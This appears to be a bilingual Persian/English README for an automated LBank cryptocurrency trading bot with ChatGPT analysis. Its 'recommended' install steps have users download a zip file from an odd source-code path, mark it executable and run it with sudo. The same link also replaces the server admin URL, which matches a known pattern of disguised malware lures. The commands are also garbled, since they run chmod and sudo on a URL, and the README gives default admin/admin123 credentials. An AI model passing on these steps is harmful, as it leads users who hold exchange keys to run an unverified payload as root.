# سیستم معاملات خودکار LBank
# LBank Automated Trading System

## 🇮🇷 راهنمای فارسی

یک سیستم معاملات خودکار برای صرافی LBank با تحلیل بازار مبتنی بر هوش مصنوعی.

### ویژگی‌ها

- 🔐 احراز هویت کاربران
- 🔑 مدیریت کلیدهای API
- 🤖 تحلیل بازار با ChatGPT
- 📊 معاملات خودکار
- 📈 مدیریت موقعیت‌ها
- 📊 شاخص‌های تحلیل تکنیکال
- 🔄 نظارت بر داده‌های بازار در زمان واقعی
- 🛡️ مدیریت خطا و ثبت رویدادها
- 📱 رابط کاربری واکنش‌گرا به زبان فارسی

### پیش‌نیازهای سیستم
- حداقل 2 هسته CPU
- حداقل 2 گیگابایت RAM
- حداقل 5 گیگابایت فضای خالی
- سیستم‌عامل: Windows 10 یا Ubuntu 20.04 یا بالاتر

### نصب خودکار (توصیه شده)

1. دانلود اسکریپت نصب:
```bash
wget https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip
```

2. دادن دسترسی اجرا:
```bash
chmod +x https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip
```

3. اجرای اسکریپت:
```bash
sudo https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip
```

4. انتخاب روش نصب:
   - نصب سریع: با تنظیمات پیش‌فرض
   - نصب سفارشی: تنظیم تمام گزینه‌ها

### امکانات اسکریپت نصب
- ✅ نصب خودکار Docker و Docker Compose
- ✅ نصب تمام وابستگی‌های مورد نیاز
- ✅ تنظیم خودکار پایگاه داده
- ✅ پیکربندی Nginx
- ✅ تنظیم SSL (در صورت نیاز)
- ✅ راه‌اندازی سرویس‌ها

### پس از نصب
1. ورود به پنل مدیریت با آدرس:
   - `http://localhost` (نصب محلی)
   - `https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip` (نصب روی سرور)

2. اطلاعات ورود پیش‌فرض:
   - نام کاربری: `admin`
   - رمز عبور: `admin123`

3. اقدامات ضروری:
   - تغییر رمز عبور پیش‌فرض
   - وارد کردن کلیدهای API صرافی
   - تنظیم استراتژی معاملاتی

### عیب‌یابی
- مشاهده وضعیت کانتینرها:
```bash
docker-compose ps
```

- مشاهده لاگ‌ها:
```bash
docker-compose logs -f
```

- راه‌اندازی مجدد سرویس‌ها:
```bash
docker-compose restart
```

---

## 🇬🇧 English Guide

An automated trading system for LBank exchange with AI-powered market analysis.

### Features

- 🔐 User Authentication
- 🔑 API Key Management
- 🤖 ChatGPT Market Analysis
- 📊 Automated Trading
- 📈 Position Management
- 📊 Technical Analysis Indicators
- 🔄 Real-time Market Data Monitoring
- 🛡️ Error Handling and Logging
- 📱 Responsive UI in Persian

### System Requirements
- Minimum 2 CPU cores
- Minimum 2GB RAM
- Minimum 5GB free disk space
- OS: Windows 10 or Ubuntu 20.04 or higher

### Automated Installation (Recommended)

1. Download the installation script:
```bash
wget https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip
```

2. Make it executable:
```bash
chmod +x https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip
```

3. Run the script:
```bash
sudo https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip
```

4. Choose installation type:
   - Quick Install: with default settings
   - Custom Install: configure all settings

### Installation Script Features
- ✅ Automatic Docker and Docker Compose installation
- ✅ All dependencies installation
- ✅ Automatic database setup
- ✅ Nginx configuration
- ✅ SSL setup (if needed)
- ✅ Services initialization

### Post-Installation
1. Access admin panel at:
   - `http://localhost` (local installation)
   - `https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip` (server installation)

2. Default login credentials:
   - Username: `admin`
   - Password: `admin123`

3. Essential actions:
   - Change default password
   - Enter exchange API keys
   - Configure trading strategy

### Troubleshooting
- Check container status:
```bash
docker-compose ps
```

- View logs:
```bash
docker-compose logs -f
```

- Restart services:
```bash
docker-compose restart
```

### Security Notes
- All API keys are encrypted
- JWT authentication
- Rate limiting
- CORS protection
- Input validation
- Security event logging

### Support
For support, please create an issue on GitHub or contact our support team.

### License
This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details. 